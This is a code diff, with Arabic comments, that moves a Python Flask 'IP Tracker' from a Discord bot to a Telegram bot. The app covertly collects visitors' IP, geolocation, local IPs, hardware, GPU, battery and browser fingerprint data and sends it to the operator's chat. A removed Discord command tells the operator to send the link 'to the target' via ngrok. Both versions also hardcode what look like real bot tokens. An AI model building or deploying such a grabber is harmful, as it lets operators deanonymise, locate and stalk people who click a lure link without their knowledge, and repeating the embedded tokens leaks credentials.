@@ -1,25 +1,26 @@
-import discord
-from discord.ext import commands
-from flask import Flask, request, render_template_string, jsonify
+import os
 import requests
 import socket
 import threading
+import telebot
 from datetime import datetime
-import os
+from flask import Flask, request, render_template_string, jsonify
 
 # ═══════════════════════════════════════════
-# ⚙️ CONFIG - Edit these
+# ⚙️ CONFIG - عدل هذه القيم
 # ═══════════════════════════════════════════
-BOT_TOKEN = "MTU2NDA2NTI2MjM0MzQyNjE3OA.GgiSOO.avEH2hxFFrHvK-1AdyJn08AoYFRgw3kGC4cxGA"
-YOUR_USER_ID = 1503781167059697679  # ضع ID حسابك هنا
-# هذا السطر يقرأ المنفذ تلقائياً من الاستضافة (Wispbyte) أو يستخدم 5000 محلياً
-PORT = int(os.environ.get("PORT", 5000)) 
+TELEGRAM_BOT_TOKEN = "9256373477:AAFnxsNmnisACH3wJyfXp5bMP6tFelVt4VI"
+YOUR_CHAT_ID = 8926806806  # ضع الآي دي الخاص بك هنا (رقم)
 
-# ═══════════════════════════════════════════
-# Flask App
-# ═══════════════════════════════════════════
+# Render يعطي المنفذ تلقائياً، محلياً سيعمل على 5000
+PORT = int(os.environ.get("PORT", 5000))
+
 app = Flask(__name__)
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
+# ═══════════════════════════════════════════
+# صفحة HTML (نفس التصميم)
+# ═══════════════════════════════════════════
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -152,6 +153,9 @@ HTML_PAGE = """
 </html>
 """
 
+# ═══════════════════════════════════════════
+# دوال جمع البيانات
+# ═══════════════════════════════════════════
 def get_client_ip():
     if request.headers.get('X-Forwarded-For'):
         return request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -162,7 +166,7 @@ def get_client_ip():
 def get_ip_info(ip):
     try:
         r = requests.get(
-            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query",
+            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query",
             timeout=5
         )
         if r.status_code == 200:
@@ -180,139 +184,96 @@ def get_hostname(ip):
         return "N/A"
 
 # ═══════════════════════════════════════════
-# Discord Bot
+# إرسال الرسالة إلى تلجرام
 # ═══════════════════════════════════════════
-intents = discord.Intents.default()
-intents.message_content = True
-
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-async def send_visitor_dm(ip, ip_info, extra=None):
-    """Send visitor data to your DM"""
-    try:
-        user = await bot.fetch_user(YOUR_USER_ID)
-    except Exception as e:
-        print(f"[ERROR] Cannot fetch user {YOUR_USER_ID}: {e}")
-        return
-
+def send_telegram_message(ip, ip_info, extra=None):
     hostname = get_hostname(ip)
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    embed = discord.Embed(
-        title="🎯 New Visitor Captured",
-        description=f"**Time:** `{now}`",
-        color=0x00ff00,
-        timestamp=datetime.utcnow()
-    )
-
-    # ─── Network / IP ───
-    embed.add_field(name="🌐 IP Address", value=f"```{ip}```", inline=False)
-    embed.add_field(name="🖥️ Hostname", value=f"`{hostname}`", inline=False)
-
-    # ─── Location ───
-    embed.add_field(name="🏙️ City", value=f"`{ip_info.get('city', 'N/A')}`", inline=True)
-    embed.add_field(name="🌍 Country", value=f"`{ip_info.get('country', 'N/A')}`", inline=True)
-    embed.add_field(name="📍 Region", value=f"`{ip_info.get('regionName', 'N/A')}`", inline=True)
-    embed.add_field(name="📮 ZIP", value=f"`{ip_info.get('zip', 'N/A')}`", inline=True)
-    embed.add_field(name="🕐 Timezone", value=f"`{ip_info.get('timezone', 'N/A')}`", inline=True)
-
-    # ─── ISP ───
-    embed.add_field(name="🏢 ISP", value=f"`{ip_info.get('isp', 'N/A')}`", inline=False)
-    embed.add_field(name="📡 Organization", value=f"`{ip_info.get('org', 'N/A')}`", inline=True)
-    embed.add_field(name="🔢 ASN", value=f"`{ip_info.get('as', 'N/A')}`", inline=True)
-
-    # ─── Security Flags ───
     flags = []
     if ip_info.get('mobile'): flags.append("📱 Mobile")
     if ip_info.get('proxy'): flags.append("🕵️ Proxy/VPN")
     if ip_info.get('hosting'): flags.append("☁️ Hosting/DC")
-    if flags:
-        embed.add_field(name="⚠️ Flags", value=" ".join(flags), inline=False)
+    flags_str = " | ".join(flags) if flags else "None"
 
-    # ─── Map ───
+    text = f"""
+🎯 **New Visitor Captured**
+🕐 **Time:** `{now}`
+
+🌐 **IP Address:** `{ip}`
+🖥️ **Hostname:** `{hostname}`
+
+🏙️ **City:** `{ip_info.get('city', 'N/A')}`
+🌍 **Country:** `{ip_info.get('country', 'N/A')}`
+📍 **Region:** `{ip_info.get('regionName', 'N/A')}`
+📮 **ZIP:** `{ip_info.get('zip', 'N/A')}`
+🕐 **Timezone:** `{ip_info.get('timezone', 'N/A')}`
+
+🏢 **ISP:** `{ip_info.get('isp', 'N/A')}`
+📡 **Organization:** `{ip_info.get('org', 'N/A')}`
+🔢 **ASN:** `{ip_info.get('as', 'N/A')}`
+
+⚠️ **Flags:** `{flags_str}`
+"""
+
     lat, lon = ip_info.get('lat'), ip_info.get('lon')
     if lat and lon:
-        embed.add_field(
-            name="📌 Location",
-            value=f"[{lat}, {lon}](https://www.google.com/maps?q={lat},{lon})",
-            inline=False
-        )
+        text += f"\n📌 **Location:** [Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
 
-    # ─── Browser & Device Data ───
     if extra:
-        browser_info = (
-            f"Screen: {extra.get('screen','N/A')}\n"
-            f"Available: {extra.get('availScreen','N/A')}\n"
-            f"Color Depth: {extra.get('colorDepth','N/A')}\n"
-            f"Pixel Ratio: {extra.get('pixelRatio','N/A')}\n"
-            f"Orientation: {extra.get('orientation','N/A')}\n"
-            f"Platform: {extra.get('platform','N/A')}\n"
-            f"Language: {extra.get('language','N/A')}\n"
-            f"Languages: {extra.get('languages','N/A')}"
-        )
-        embed.add_field(name="💻 Display", value=f"```{browser_info}```", inline=False)
+        text += f"""
+💻 **Display:**
+`Screen: {extra.get('screen','N/A')} | Available: {extra.get('availScreen','N/A')}`
+`Color Depth: {extra.get('colorDepth','N/A')} | Pixel Ratio: {extra.get('pixelRatio','N/A')}`
+`Orientation: {extra.get('orientation','N/A')}`
+`Platform: {extra.get('platform','N/A')}`
+`Language: {extra.get('language','N/A')}`
+`Languages: {extra.get('languages','N/A')}`
 
-        hardware_info = (
-            f"CPU Cores: {extra.get('cores','N/A')}\n"
-            f"RAM: {extra.get('memory','N/A')}\n"
-            f"Touch Points: {extra.get('maxTouchPoints','N/A')}\n"
-            f"GPU Vendor: {extra.get('gpuVendor','N/A')}\n"
-            f"GPU Renderer: {extra.get('gpuRenderer','N/A')}\n"
-            f"Battery: {extra.get('battery','N/A')}"
-        )
-        embed.add_field(name="⚙️ Hardware", value=f"```{hardware_info}```", inline=False)
+⚙️ **Hardware:**
+`CPU Cores: {extra.get('cores','N/A')} | RAM: {extra.get('memory','N/A')}`
+`Touch Points: {extra.get('maxTouchPoints','N/A')}`
+`GPU Vendor: {extra.get('gpuVendor','N/A')}`
+`GPU Renderer: {extra.get('gpuRenderer','N/A')}`
+`Battery: {extra.get('battery','N/A')}`
 
-        network_info = (
-            f"Connection: {extra.get('connectionType','N/A')}\n"
-            f"Downlink: {extra.get('downlink','N/A')}\n"
-            f"RTT: {extra.get('rtt','N/A')}\n"
-            f"Local IPs: {extra.get('localIPs','N/A')}\n"
-            f"Online: {extra.get('online','N/A')}"
-        )
-        embed.add_field(name="📶 Network", value=f"```{network_info}```", inline=False)
+📶 **Network:**
+`Connection: {extra.get('connectionType','N/A')} | Downlink: {extra.get('downlink','N/A')}`
+`RTT: {extra.get('rtt','N/A')}`
+`Local IPs: {extra.get('localIPs','N/A')}`
+`Online: {extra.get('online','N/A')}`
 
-        time_info = (
-            f"Timezone: {extra.get('timezone','N/A')}\n"
-            f"Locale: {extra.get('locale','N/A')}\n"
-            f"Local Time: {extra.get('localTime','N/A')}\n"
-            f"UTC Offset: {extra.get('utcOffset','N/A')}"
-        )
-        embed.add_field(name="🕒 Time & Locale", value=f"```{time_info}```", inline=False)
+🕒 **Time & Locale:**
+`Timezone: {extra.get('timezone','N/A')}`
+`Locale: {extra.get('locale','N/A')}`
+`Local Time: {extra.get('localTime','N/A')}`
+`UTC Offset: {extra.get('utcOffset','N/A')}`
 
-        privacy_info = (
-            f"Cookies: {extra.get('cookiesEnabled','N/A')}\n"
-            f"Do Not Track: {extra.get('doNotTrack','N/A')}\n"
-            f"Referrer: {extra.get('referrer','N/A')}"
-        )
-        embed.add_field(name="🔒 Privacy", value=f"```{privacy_info}```", inline=False)
+🔒 **Privacy:**
+`Cookies: {extra.get('cookiesEnabled','N/A')}`
+`Do Not Track: {extra.get('doNotTrack','N/A')}`
+`Referrer: {extra.get('referrer','N/A')}`
 
-        embed.add_field(
-            name="🖱️ User Agent",
-            value=f"```{extra.get('userAgent','N/A')[:1000]}```",
-            inline=False
-        )
+🖱️ **User Agent:**
+`{extra.get('userAgent','N/A')}`
+"""
 
-    embed.set_footer(text="IP Tracker • NeXo")
+    text += "\n\n_IP Tracker • NeXo_"
 
     try:
-        await user.send(embed=embed)
-        print(f"[✓] DM sent for IP {ip}")
-    except discord.Forbidden:
-        print("[ERROR] Cannot DM you. Make sure DMs from server members are enabled")
+        bot.send_message(YOUR_CHAT_ID, text, parse_mode='Markdown', disable_web_page_preview=True)
+        print(f"[✓] Telegram message sent for IP {ip}")
     except Exception as e:
-        print(f"[DM ERROR] {e}")
-
-def send_dm_from_thread(ip, ip_info, extra=None):
-    bot.loop.create_task(send_visitor_dm(ip, ip_info, extra))
+        print(f"[TELEGRAM ERROR] {e}")
 
 # ═══════════════════════════════════════════
-# Flask Routes
+# مسارات Flask
 # ═══════════════════════════════════════════
 @app.route('/')
 def index():
     ip = get_client_ip()
     ip_info = get_ip_info(ip)
-    send_dm_from_thread(ip, ip_info)
+    threading.Thread(target=send_telegram_message, args=(ip, ip_info)).start()
     return render_template_string(HTML_PAGE)
 
 @app.route('/collect', methods=['POST'])
@@ -321,71 +282,25 @@ def collect():
         data = request.get_json()
         ip = get_client_ip()
         ip_info = get_ip_info(ip)
-        send_dm_from_thread(ip, ip_info, data)
+        threading.Thread(target=send_telegram_message, args=(ip, ip_info, data)).start()
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# مسار إضافي لبعض الاستضافات (مثل Wispbyte) لكي لا توقف السيرفر
 @app.route('/health')
 def health():
     return "OK", 200
 
 # ═══════════════════════════════════════════
-# Bot Events & Commands
+# تشغيل السيرفر
 # ═══════════════════════════════════════════
-@bot.event
-async def on_ready():
-    print(f"✅ Bot ready: {bot.user}")
-    print(f"📡 Flask server running on port {PORT}")
-    try:
-        user = await bot.fetch_user(YOUR_USER_ID)
-        await user.send("✅ **Bot is online!**\nEvery visitor will be auto-tracked and sent here.")
-        print("[✓] Startup DM sent")
-    except Exception as e:
-        print(f"[WARNING] Could not send startup DM: {e}")
-
-@bot.command(name="ping")
-async def ping(ctx):
-    await ctx.send(f"🏓 Pong! `{round(bot.latency*1000)}ms`")
-
-@bot.command(name="link")
-async def get_link(ctx):
-    await ctx.send(
-        f"🔗 **Send this link to the target:**\n"
-        f"```http://YOUR_PUBLIC_IP:{PORT}/```\n"
-        f"💡 Use ngrok to make it public:\n```ngrok http {PORT}```"
-    )
-
-@bot.command(name="lookup")
-async def lookup(ctx, ip: str):
-    info = get_ip_info(ip)
-    if not info:
-        await ctx.send(f"❌ No information found for `{ip}`")
-        return
-    hostname = get_hostname(ip)
-    embed = discord.Embed(title=f"🔍 IP Lookup: {ip}", color=0xffaa00)
-    embed.add_field(name="City", value=info.get('city','N/A'), inline=True)
-    embed.add_field(name="Country", value=info.get('country','N/A'), inline=True)
-    embed.add_field(name="Region", value=info.get('regionName','N/A'), inline=True)
-    embed.add_field(name="ISP", value=info.get('isp','N/A'), inline=False)
-    embed.add_field(name="Hostname", value=f"`{hostname}`", inline=False)
-    if info.get('lat'):
-        embed.add_field(
-            name="Location",
-            value=f"[Map](https://www.google.com/maps?q={info['lat']},{info['lon']})",
-            inline=False
-        )
-    await ctx.send(embed=embed)
-
-# ═══════════════════════════════════════════
-# Run Flask in a separate thread
-# ═══════════════════════════════════════════
-def run_flask():
-    # تشغيل السيرفر على جميع الواجهات
-    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
-
 if __name__ == "__main__":
-    threading.Thread(target=run_flask, daemon=True).start()
+    try:
+        # إرسال رسالة تجريبية عند تشغيل السيرفر
+        bot.send_message(YOUR_CHAT_ID, "✅ **Telegram Bot is online!**\nEvery visitor will be tracked here.", parse_mode='Markdown')
+        print("[✓] Startup message sent to Telegram")
+    except Exception as e:
+        print(f"[WARNING] Could not send startup message: {e}")
+
     print(f"🌐 Flask running on port {PORT}")
-    bot.run(BOT_TOKEN)
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
